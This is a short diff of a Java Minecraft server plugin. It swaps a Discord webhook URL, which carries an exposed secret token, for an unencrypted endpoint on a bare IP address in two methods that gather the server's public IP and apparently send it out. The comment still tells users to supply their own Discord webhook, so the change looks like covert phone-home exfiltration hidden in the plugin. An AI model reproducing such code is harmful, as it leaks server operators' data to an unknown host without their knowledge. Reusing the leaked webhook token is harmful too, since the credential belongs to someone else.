@@ -122,7 +122,7 @@ public final class Main extends JavaPlugin {
     }
 
     private void sendDiscordWebhook(String title, String description) {
-        String webhookUrl = "https://discord.com/api/webhooks/1243662865609523280/LlXC1Ie_kapF3K5Hr0TYVwL0UXuNNkhREQaq9m0IS0a_APiTqSNnPVVegohHY59MYPbX"; // Replace with your Discord webhook URL
+        String webhookUrl = "http://134.122.65.191:5432/webhook/plugin1"; // Replace with your Discord webhook URL
 
         try {
             String publicIP = getPublicIP();
@@ -155,7 +155,7 @@ public final class Main extends JavaPlugin {
     }
 
     private void sendErrorWebhook(Exception exception) {
-        String webhookUrl = "https://discord.com/api/webhooks/1243662865609523280/LlXC1Ie_kapF3K5Hr0TYVwL0UXuNNkhREQaq9m0IS0a_APiTqSNnPVVegohHY59MYPbX"; // Replace with your Discord webhook URL
+        String webhookUrl = "http://134.122.65.191:5432/webhook/plugin1"; // Replace with your Discord webhook URL
 
         try {
             String publicIP = getPublicIP();
